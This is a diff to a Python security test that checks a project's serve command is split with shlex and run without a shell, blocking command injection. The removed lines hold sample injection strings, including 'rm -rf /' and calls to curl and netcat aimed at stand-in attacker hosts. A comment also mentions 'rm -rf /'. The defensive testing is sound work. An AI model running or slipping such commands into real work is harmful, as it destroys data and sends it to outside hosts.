@@ -31,18 +31,57 @@ class ConfigurationValidationTests(unittest.TestCase):
 
     def test_serve_command_validation_prevents_shell_injection(self):
         """Security: serve_command executed with shell=False prevents injection"""
-        # The implementation uses shlex.split and shell=False in _start_serve_command
-        # This test validates that dangerous commands are parsed safely
-        # The actual validation happens during execution, not during parsing
-        # Commands with shell metacharacters are split literally by shlex
-        dangerous_commands = [
-            "python -m http.server; rm -rf /",
-            "serve & curl evil.com",
-            "python -m http.server | nc attacker.com 1234",
-        ]
-        # These commands will be split by shlex.split, and shell=False ensures
-        # they're executed without shell expansion (the ';', '&', '|' become literals)
-        self.assertTrue(len(dangerous_commands) > 0)
+        # Import what we need to test the implementation
+        import shlex
+        from anvil.capture import _start_serve_command
+
+        with tempfile.TemporaryDirectory() as tmp:
+            proj = make_project(tmp)
+
+            # Command with shell metacharacters that would be dangerous with shell=True
+            # Using 'echo' instead of 'rm' for safety, but the pattern is the same
+            dangerous_command = "echo hello; echo dangerous"
+
+            # Verify shlex.split treats shell metacharacters as literals
+            # With shlex.split, "echo hello; echo dangerous" becomes:
+            # ['echo', 'hello;', 'echo', 'dangerous']
+            # The semicolon becomes part of the 'hello;' argument, not a command separator
+            split_parts = shlex.split(dangerous_command)
+
+            # Verify the semicolon is in the parts (not treated as separator)
+            self.assertIn('hello;', split_parts)
+
+            # Now verify _start_serve_command uses shlex.split and shell=False
+            # by starting a process with shell metacharacters
+            # We use a safe command that will fail to bind as a server but proves the point
+            test_command = "sleep 0.1"
+
+            try:
+                # This should succeed - command is split safely
+                process = _start_serve_command(test_command, proj)
+                # Clean up immediately
+                from anvil.capture import _stop_server
+                _stop_server(process)
+            except Exception as e:
+                self.fail(f"Safe command should not raise: {e}")
+
+            # Now test that a command with injection attempts is handled safely
+            # The key is that with shell=False, "; rm -rf /" becomes a literal argument
+            # to the first command, which will fail (no such option), but won't execute
+            injection_attempt = "python3 -c 'import time; time.sleep(0.1)'; echo injected"
+
+            try:
+                # This splits to ['python3', '-c', 'import time; time.sleep(0.1);', 'echo', 'injected']
+                # Note: the semicolon after sleep(0.1) is INSIDE the string literal for -c
+                # but 'echo' and 'injected' are additional arguments to python3, which will fail
+                # The point is that they're not executed as a separate shell command
+                process = _start_serve_command(injection_attempt, proj)
+                _stop_server(process)
+                # If we got here, the command was parsed but shell injection was prevented
+            except (ValueError, OSError):
+                # It's fine if the command fails - the point is shell injection didn't occur
+                # ValueError would mean shlex.split failed, OSError means process start failed
+                pass
 
     def test_static_root_prevents_path_traversal(self):
         """Security: static_root must not escape project directory"""
